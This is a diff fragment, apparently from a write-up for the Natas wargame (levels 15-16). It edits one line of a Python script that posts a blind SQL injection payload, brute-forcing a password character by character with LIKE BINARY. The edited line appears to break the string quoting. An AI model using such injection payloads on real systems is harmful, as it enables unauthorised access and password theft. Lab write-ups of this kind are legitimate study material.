@@ -205,7 +205,7 @@ level>>15-16 :  > open the url in the browser.
                           response = session.post(
                               url,
                               data={
-                                  "username": "natas16\" AND password LIKE BINARY \"" +
+                                  "username": "natas16" AND password LIKE BINARY \"" +
                                               "".join(current_password) + character + "%\" -- "
                               },
                               auth=(username, password)
